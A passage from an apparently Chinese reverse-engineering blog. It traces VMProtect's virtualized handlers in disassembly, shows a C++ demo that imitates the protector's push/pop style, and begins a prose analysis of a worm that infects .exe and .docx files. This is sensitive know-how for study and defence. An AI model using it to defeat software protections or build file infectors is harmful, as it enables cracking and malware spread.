33CB             xor ecx,ebx</span><br><span class=\"line\">0047E6C8    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0047E6CF    D1C9             ror ecx,1</span><br><span class=\"line\">0044CE2D    49               dec ecx</span><br><span class=\"line\">0044CE2E    F7D1             not ecx</span><br><span class=\"line\">0044CE30    33D9             xor ebx,ecx</span><br><span class=\"line\">0044CE33    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                    </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                                </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                      </span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                    </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0041043E</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-3\"><a href=\"#vPush-3\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0041043E    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">00410443    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0041044E    32CB             xor cl,bl</span><br><span class=\"line\">00410450    F6D9             neg cl</span><br><span class=\"line\">00410452    80F1 0E          xor cl,0xE</span><br><span class=\"line\">00410460    80E9 21          sub cl,0x21</span><br><span class=\"line\">0041046B    F6D9             neg cl</span><br><span class=\"line\">00410471    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">00410479    32D9             xor bl,cl</span><br><span class=\"line\">0041047D    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">00410480    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">00410489    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">00410497    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0041049E    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">004104A4    33CB             xor ecx,ebx</span><br><span class=\"line\">004104A8    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">004104B1    D1C9             ror ecx,1</span><br><span class=\"line\">004104B3    49               dec ecx</span><br><span class=\"line\">00440D59    F7D1             not ecx</span><br><span class=\"line\">00440D5C    33D9             xor ebx,ecx</span><br><span class=\"line\">004251B5    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                      </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                 ; test1_vm.0043D198</span><br><span class=\"line\">00458194    5F               pop edi                                                     </span><br><span class=\"line\">0044BD0C    55               push ebp                                                  </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x00421D3D</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-4\"><a href=\"#vPush-4\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00421D3D    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">00421D43    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">00421D49    32CB             xor cl,bl</span><br><span class=\"line\">00421D55    F6D9             neg cl</span><br><span class=\"line\">00421D5B    80F1 0E          xor cl,0xE</span><br><span class=\"line\">00421D64    80E9 21          sub cl,0x21</span><br><span class=\"line\">00421D6D    F6D9             neg cl</span><br><span class=\"line\">00421D72    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">00421D78    32D9             xor bl,cl</span><br><span class=\"line\">00421D81    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">00421D87    8DB6 FCFFFFFF    lea esi,dword ptr ds:[esi-0x4]</span><br><span class=\"line\">00421D95    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">00421D9D    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">00455281    8DBF 04000000    lea edi,dword ptr ds:[edi+0x4]</span><br><span class=\"line\">00455289    33CB             xor ecx,ebx</span><br><span class=\"line\">0045528E    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">00455294    D1C9             ror ecx,1</span><br><span class=\"line\">0043425D    49               dec ecx</span><br><span class=\"line\">00434263    F7D1             not ecx</span><br><span class=\"line\">00434267    33D9             xor ebx,ecx</span><br><span class=\"line\">0043426F    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                                </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0040D075    FC               cld</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                                   ; test1_vm.0043D19D</span><br><span class=\"line\">00458194    5F               pop edi                                                      </span><br><span class=\"line\">0044BD0C    55               push ebp                                                   </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x0040EB2E</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"vPush-5\"><a href=\"#vPush-5\" class=\"headerlink\" title=\"vPush\"></a>vPush</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0040EB2E    0FB60F           movzx ecx,byte ptr ds:[edi]</span><br><span class=\"line\">0040EB37    8DBF 01000000    lea edi,dword ptr ds:[edi+0x1]</span><br><span class=\"line\">0040EB40    32CB             xor cl,bl</span><br><span class=\"line\">0040EB4F    F6D9             neg cl</span><br><span class=\"line\">0040EB51    80F1 0E          xor cl,0xE</span><br><span class=\"line\">0040EB5B    80E9 21          sub cl,0x21</span><br><span class=\"line\">0040EB68    F6D9             neg cl</span><br><span class=\"line\">0040EB6E    80F1 E2          xor cl,0xE2</span><br><span class=\"line\">0040EB76    32D9             xor bl,cl</span><br><span class=\"line\">00440ED1    8B140C           mov edx,dword ptr ss:[esp+ecx]</span><br><span class=\"line\">00440ED8    81EE 04000000    sub esi,0x4</span><br><span class=\"line\">00440EDE    8916             mov dword ptr ds:[esi],edx</span><br><span class=\"line\">00440EE0    8B0F             mov ecx,dword ptr ds:[edi]</span><br><span class=\"line\">0041D911    81C7 04000000    add edi,0x4                                           </span><br><span class=\"line\">0041D91A    33CB             xor ecx,ebx</span><br><span class=\"line\">0042EDBF    81E9 8C1F9123    sub ecx,0x23911F8C</span><br><span class=\"line\">0042AD19    D1C9             ror ecx,1</span><br><span class=\"line\">0042AD1B    49               dec ecx</span><br><span class=\"line\">0042AD1C    F7D1             not ecx</span><br><span class=\"line\">0042AD1E    33D9             xor ebx,ecx</span><br><span class=\"line\">004526DB    03E9             add ebp,ecx</span><br><span class=\"line\">00462636    8D5424 60        lea edx,dword ptr ss:[esp+0x60]</span><br><span class=\"line\">0046263A    3BF2             cmp esi,edx</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF    ja test1_vm.0044BD0C</span><br><span class=\"line\">00481408    8BC4             mov eax,esp</span><br><span class=\"line\">0048140A    B9 40000000      mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80        lea edx,dword ptr ds:[esi-0x80]</span><br><span class=\"line\">00467341    81E2 FCFFFFFF    and edx,-0x4</span><br><span class=\"line\">00467347    2BD1             sub edx,ecx</span><br><span class=\"line\">00467349    8BE2             mov esp,edx</span><br><span class=\"line\">0046734B    57               push edi                                                     </span><br><span class=\"line\">0045A32C    56               push esi</span><br><span class=\"line\">0045A32D    0FB7F2           movzx esi,dx</span><br><span class=\"line\">0045A330    9C               pushfd</span><br><span class=\"line\">00489ACC    8BF0             mov esi,eax                                               </span><br><span class=\"line\">00489AD2    8BFA             mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4            rep movs byte ptr es:[edi],byte ptr ds:[esi]</span><br><span class=\"line\">0045B5C2    9D               popfd</span><br><span class=\"line\">0045818E    5E               pop esi                                                                                               ; test1_vm.0043D1A2</span><br><span class=\"line\">00458194    5F               pop edi                                                       </span><br><span class=\"line\">0044BD0C    55               push ebp                                                   </span><br><span class=\"line\">0044BD0D    C3               retn\t;0x00415543</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"VMExit\"><a href=\"#VMExit\" class=\"headerlink\" title=\"VMExit\"></a>VMExit</h3><blockquote>\n<p>退出虚拟机,执行printf</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00415543    8BE6             mov esp,esi</span><br><span class=\"line\">0041554A    5D               pop ebp                                                       ; 0019FF2C</span><br><span class=\"line\">0041554B    5A               pop edx                                                       ; 0019FF2C</span><br><span class=\"line\">0041554D    5F               pop edi                                                       ; 0019FF2C</span><br><span class=\"line\">0041554E    5E               pop esi                                                       ; 0019FF2C</span><br><span class=\"line\">0041554F    5B               pop ebx                                                       ; 0019FF2C</span><br><span class=\"line\">00415550    9D               popfd</span><br><span class=\"line\">00415557    59               pop ecx                                                       ; 0019FF2C</span><br><span class=\"line\">00415558    58               pop eax                                                       ; 0019FF2C</span><br><span class=\"line\">0043B984    C3               retn</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>printf执行完毕后重新回到入口函数执行</p>\n</blockquote>\n<h2 id=\"2、防侧漏用苏菲\"><a href=\"#2、防侧漏用苏菲\" class=\"headerlink\" title=\"2、防侧漏用苏菲\"></a>2、防侧漏用苏菲</h2><p>因为是push指令，需要检查栈是否发生溢出，防止vm_context被真实堆栈覆盖。</p>\n<h3 id=\"VMP堆栈检查\"><a href=\"#VMP堆栈检查\" class=\"headerlink\" title=\"VMP堆栈检查\"></a>VMP堆栈检查</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">00462636    8D5424 60       lea edx,dword ptr ss:[esp+0x60]\t\t\t;edx=v_esp+0x60</span><br><span class=\"line\">0046263A    3BF2            cmp esi,edx\t\t\t\t\t\t\t\t;原始esp与edx比较</span><br><span class=\"line\">00481402  ^\\0F87 04A9FCFF   ja test1_vm.0044BD0C\t\t\t\t\t;如果原始esp&gt;edx就正常返回,防止原始esp内容覆盖了vm_context</span><br><span class=\"line\">00481408    8BC4            mov eax,esp\t\t\t\t\t\t\t\t;将v_esp传给eax</span><br><span class=\"line\">0048140A    B9 40000000     mov ecx,0x40</span><br><span class=\"line\">0048140F    8D5426 80       lea edx,dword ptr ds:[esi-0x80]\t\t\t;把原始esp上台0x80大小,然后把地址传给edx</span><br><span class=\"line\">00467341    81E2 FCFFFFFF   and edx,-0x4\t\t\t\t\t\t\t</span><br><span class=\"line\">00467347    2BD1            sub edx,ecx</span><br><span class=\"line\">00467349    8BE2            mov esp,edx\t\t\t\t\t\t\t\t;把新的堆栈地址传给v_esp</span><br><span class=\"line\">0046734B    57              push edi                               </span><br><span class=\"line\">0045A32C    56              push esi</span><br><span class=\"line\">0045A330    9C              pushfd</span><br><span class=\"line\">00489ACC    8BF0            mov esi,eax\t\t\t\t\t\t\t\t</span><br><span class=\"line\">00489AD2    8BFA            mov edi,edx</span><br><span class=\"line\">0045B5BE    F3:A4           rep movs byte ptr es:[edi],byte ptr ds:[esi] ;把原来v_esp的内容拷贝到新的v_esp</span><br><span class=\"line\">0045B5C2    9D              popfd</span><br><span class=\"line\">0045818E    5E              pop esi                                  </span><br><span class=\"line\">00458194    5F              pop edi                                  </span><br><span class=\"line\">0044BD0C    55              push ebp                                 </span><br><span class=\"line\">0044BD0D    C3              retn\t\t\t\t\t\t\t\t\t;0x004786D0\t\t</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3、简单提几句\"><a href=\"#3、简单提几句\" class=\"headerlink\" title=\"3、简单提几句\"></a>3、简单提几句</h2><ul>\n<li>vmp在初始化时会保存当前环境，将寄存器通过push进行保存，退出虚拟机时恢复寄存器</li>\n<li>在执行系统函数时，vmp会退出虚拟机，恢复初始环境；函数执行完毕后重新进入虚拟机。</li>\n<li>vmp的虚拟化技术是通过将一条一句进行拆分，然后以push和pop形式进行实现，因此被称为栈虚拟机。</li>\n<li>opcode的第一个字节若为操作数，则该操作数指向为vm_context的其中一个寄存器；若为四字节则为下一个要跳转的handler地址。</li>\n<li>vmp是真的恶心啊。</li>\n</ul>\n<h1 id=\"四、真理只在大炮射程之内\"><a href=\"#四、真理只在大炮射程之内\" class=\"headerlink\" title=\"四、真理只在大炮射程之内\"></a>四、真理只在大炮射程之内</h1><p>经过对VMP虚拟化代码的分析后，可以使用push和pop指令按照vmp虚拟化的方式对原始的汇编语句继续改写，进行娱乐。</p>\n<h3 id=\"模拟VMP指令\"><a href=\"#模拟VMP指令\" class=\"headerlink\" title=\"模拟VMP指令\"></a>模拟VMP指令</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> format[] = <span class=\"string\">&quot;%d\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">char</span>* p = format;</span><br><span class=\"line\">__declspec(naked) <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">my_test</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tpush\tebp</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// mov ebp,esp</span></span><br><span class=\"line\">\t\tpush\tesp</span><br><span class=\"line\">\t\tpop\t\tebp</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpush\tecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// mov    dword ptr[ebp - 4], 1</span></span><br><span class=\"line\">\t\tpush\t<span class=\"number\">1</span></span><br><span class=\"line\">\t\tpush\tebp</span><br><span class=\"line\">\t\tpush\t<span class=\"number\">0F</span>FFFFFFCh</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax, edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp + <span class=\"number\">4</span>], eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tmov\t\tdword ptr[eax], edx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// mov    eax, dword ptr[ebp - 4]</span></span><br><span class=\"line\">\t\tpush\t<span class=\"number\">0F</span>FFFFFFCh</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax, edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp + <span class=\"number\">4</span>], eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[eax]</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp], edx</span><br><span class=\"line\">\t\tpop\t\teax</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// add    eax, 1</span></span><br><span class=\"line\">\t\tpush\t<span class=\"number\">1</span></span><br><span class=\"line\">\t\tpush\teax</span><br><span class=\"line\">\t\tmov\t\teax,dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx,dword ptr[esp+<span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax,edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp+<span class=\"number\">4</span>],eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// mov    dword ptr[ebp - 4], eax</span></span><br><span class=\"line\">\t\tpush\tebp</span><br><span class=\"line\">\t\tpush\t<span class=\"number\">0F</span>FFFFFFCh</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax, edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp + <span class=\"number\">4</span>], eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tmov\t\tdword ptr[eax], edx</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// mov    ecx, dword ptr[ebp - 4]</span></span><br><span class=\"line\">\t\tpush\tebp</span><br><span class=\"line\">\t\tpush\t<span class=\"number\">0F</span>FFFFFFCh</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp + <span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax, edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp + <span class=\"number\">4</span>], eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\">\t\tmov\t\teax, dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[eax]</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp], edx</span><br><span class=\"line\">\t\tpop\t\tecx</span><br><span class=\"line\">\t\tadd\t\tesp, <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpush    ecx</span><br><span class=\"line\">\t\tpush    p</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//call返回的地址</span></span><br><span class=\"line\">\t\tpush\tNext</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// call   00401070</span></span><br><span class=\"line\">\t\tpush\tprintf</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tNext :</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//add\tesp, 8</span></span><br><span class=\"line\">\t\tpush\t<span class=\"number\">8</span></span><br><span class=\"line\">\t\tpush\tesp</span><br><span class=\"line\">\t\tmov\t\teax,dword ptr[esp]</span><br><span class=\"line\">\t\tmov\t\tedx, dword ptr[esp+<span class=\"number\">4</span>]</span><br><span class=\"line\">\t\tadd\t\teax,edx</span><br><span class=\"line\">\t\tmov\t\tdword ptr[esp+<span class=\"number\">4</span>],eax</span><br><span class=\"line\">\t\tpop\t\tesi</span><br><span class=\"line\">\t\tmov\t\tesi,dword ptr[esp]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">xor</span> eax, eax</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//mov esp,ebp</span></span><br><span class=\"line\">\t\tpush\tebp</span><br><span class=\"line\">\t\tpop\t\tesp</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpop\t\tebp</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">my_test</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行无任何问题且能正常输出。</p>\n<p><img src=\"/../images/Anti/VMProtect%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E5%8C%96%E6%B5%81%E7%A8%8B/image-20230105162339766.png\" alt=\"image-20230105162339766\"></p>\n<h1 id=\"五、精准射击\"><a href=\"#五、精准射击\" class=\"headerlink\" title=\"五、精准射击\"></a>五、精准射击</h1><ul>\n<li><a href=\"https://back.engineering/17/05/2021/[VMProtect\">https://back.engineering/17/05/2021/[VMProtect</a> 2 - Detailed Analysis of the Virtual Machine Architecture]</li>\n<li><a href=\"https://back.engineering/17/05/2021/[Quick\">https://back.engineering/17/05/2021/[Quick</a> look around VMP 3.x - Part 1 : Unpacking]</li>\n<li><a href=\"https://www.52pojie.cn/thread-586130-1-1.html[VMProtect\">https://www.52pojie.cn/thread-586130-1-1.html[VMProtect</a> 3.09 虚拟机架构浅析]</li>\n<li><a href=\"https://bbs.pediy.com/thread-272152.htm[vmp2%E4%BB%A3%E7%A0%81%E8%BF%98%E5%8E%9F%E5%88%86%E4%BA%AB]\">https://bbs.pediy.com/thread-272152.htm[vmp2代码还原分享]</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-217588.htm[%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E8%BF%9B%E8%A1%8CVMP%E4%BB%A3%E7%A0%81%E8%BF%98%E5%8E%9F]\">https://bbs.pediy.com/thread-217588.htm[通过编译优化进行VMP代码还原]</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-225262.htm[%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%881%EF%BC%89%EF%BC%9A%E6%96%B0%E6%89%8B%E7%AF%87VMProtect\">https://bbs.pediy.com/thread-225262.htm[如何分析虚拟机（1）：新手篇VMProtect</a> 1.81 Demo]</li>\n</ul>\n","categories":["Anti"]},{"title":"一个易语言SouGou蠕虫样本","url":"/2024/04/21/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/","content":"<h1 id=\"一个易语言SouGou蠕虫样本\"><a href=\"#一个易语言SouGou蠕虫样本\" class=\"headerlink\" title=\"一个易语言SouGou蠕虫样本\"></a>一个易语言SouGou蠕虫样本</h1><ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2022-06-22 13:29</li>\n</ul>\n<h1 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h1><p>该样本为一个被感染了蠕虫的样本，原程序为<strong>Sougou.exe</strong>，且有正规产商签名。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>样本被运行后首先会执行蠕虫病毒，最后再执行原程序。蠕虫病毒会遍历电脑磁盘，并且感染除C盘外且后缀名为.docx和.exe的文件，其中感染.docx的方式为在文件头添加字符串<code>HELLO！</code>，感染.exe的方式为在程序头添加蠕虫病毒。</p>\n<h1 id=\"二、样本信息\"><a href=\"#二、样本信息\" class=\"headerlink\" title=\"二、样本信息\"></a>二、样本信息</h1><table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>SouGou.exe</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>233440021438C6B4D97AD822EB434842</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>051A9C3F8DA2EC70C6DD46CBA3F550D56F14D30D</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>1.02 MB (1,075,954 字节)</td>\n</tr>\n</tbody></table>\n<p>通过<code>Resource Hacker</code>工具查看资源发现为易语言的黑月编译器编译。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<h1 id=\"三、详细分析\"><a href=\"#三、详细分析\" class=\"headerlink\" title=\"三、详细分析\"></a>三、详细分析</h1><h2 id=\"1、SouGou详细分析\"><a href=\"#1、SouGou详细分析\" class=\"headerlink\" title=\"1、SouGou详细分析\"></a>1、SouGou详细分析</h2><table>\n<thead>\n<tr>\n<th>样本名</th>\n<th>SouGou.exe</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>MD5</td>\n<td>233440021438C6B4D97AD822EB434842</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>051A9C3F8DA2EC70C6DD46CBA3F550D56F14D30D</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>1.02 MB (1,075,954 字节)</td>\n</tr>\n</tbody></table>\n<p>由于是黑月编译器，直接通过对函数nullsub_1交叉引用后来到真实的程序入口点。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>样本首先是将自身读入内存，然后以字符串”<strong>&gt;&gt;&gt;&gt;&gt;&lt;—–&lt;&gt;&gt;&gt;&gt;&gt;</strong>“为目标进行数据切割。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>紧接着会判断同级路径下是否存在名为<strong>下划线(_)+样本名的.exe</strong>的可执行文件，如存在则运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>不存在则将刚刚切割得到的数据以该文件名写出后运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>此处真正目的为运行出<strong>原程序</strong>。运行原程序后随即写出主模块并运行。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%98%93%E8%AF%AD%E8%A8%80SouGou%E8%A0%95%E8%99%AB%E6%A0%B7%E6%9C%AC/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<h2 id=\"2、msimg32详细分析\"><a 